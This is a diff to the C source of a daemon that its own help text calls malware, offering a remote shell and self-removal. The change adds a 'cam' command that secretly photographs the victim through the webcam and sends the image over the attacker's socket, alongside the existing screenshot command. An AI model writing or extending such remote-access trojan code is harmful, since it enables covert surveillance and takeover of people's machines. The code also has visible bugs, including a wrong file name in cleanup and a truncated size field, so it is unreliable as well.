@@ -138,13 +138,17 @@ static uint8_t	remove_daemon(t_users *users)
 	exit(0);
 }
 
-static void	screen(t_users *users, char **envp)
+static void	screen(t_users *users, char **envp, uint8_t flag)
 {
 	pid_t	pid = 0;
-	char	*exec[] = {"/usr/bin/import", "-window", "root", "/tmp/screen.png", NULL};
+	// mplayer -vo png -frames 1 tv://
+	char	*exec_screen[] = {"/usr/bin/import", "-window", "root", "/tmp/screen.jpeg", NULL};
+	char	*exec_cam[] = {"/usr/bin/streamer", "-f", "jpeg", "-s", "1920x1080", "-o", "/tmp/cam.jpeg", NULL};
+	// streamer -f jpeg -s 1024x768 -o image.jpeg
 	int		status;
 	ssize_t	ret_read = 0;
 	char	buff[BUFFSIZE] = {0};
+	int		fd = 0;
 
 	pid = fork();
 	if (pid == -1)
@@ -153,8 +157,16 @@ static void	screen(t_users *users, char **envp)
 	}
 	else if (pid == 0)
 	{
-		if (execve(exec[0], exec, envp) == -1)
-			printf("error\n");
+		if (flag == SCREEN)
+		{
+			if (execve(exec_screen[0], exec_screen, envp) == -1)
+				printf("error\n");
+		}
+		else if (flag == CAM)
+		{
+			if (execve(exec_cam[0], exec_cam, envp) == -1)
+				printf("error\n");
+		}
 	}
 	else
 	{
@@ -163,21 +175,23 @@ static void	screen(t_users *users, char **envp)
 	}
 
 	struct stat	st;
-	int	fd = open("/tmp/screen.png", O_RDONLY);
+	if (flag == SCREEN)
+		fd = open("/tmp/screen.jpeg", O_RDONLY);
+	else
+		fd = open("/tmp/cam.jpeg", O_RDONLY);
 	if (fd)
 	{
 		fstat(fd, &st);
-		char	size[15] = {0};
+		char	size[7] = {0};
 		sprintf(size, "%lu", st.st_size);
-		send(users->sd, &size, strlen(size), 0);
-			/*send(users->sd, (void*)st.st_size, sizeof(st.st_size), 0);*/
-		/*char	buff_img[st.st_size];*/
-		/*memset(&buff_img, 0, st.st_size);*/
-		/*read(fd, &buff_img, (size_t)st.st_size);*/
-		/*send(users->sd, &buff_img, (size_t)st.st_size, 0);*/
+		send(users->sd, &size, 6, 0);
 		while ((ret_read = read(fd, &buff, BUFFSIZE)) > 0)
 			send(users->sd, &buff, ret_read, 0);
 	}
+	if (flag == SCREEN)
+		remove("/tmp/screen.png");
+	else
+		remove("/tmp/cam.jpeg");
 
 }
 
@@ -257,7 +271,9 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						if (!strcmp(buffer, "remove"))
 							remove_daemon(&users);
 						else if (!strcmp(buffer, "screen"))
-							screen(&users, envp);
+							screen(&users, envp, SCREEN);
+						else if (!strcmp(buffer, "cam"))
+							screen(&users, envp, CAM);
 						else if (!strcmp(buffer, "?"))
 							send(users.sd, "\n'shell'\t\tSpawn remote shell\n'quit'\t\tClose program\n'Remove'\tremove malware\n> ", 77, 0);
 						else if (!strcmp(buffer, "shell"))
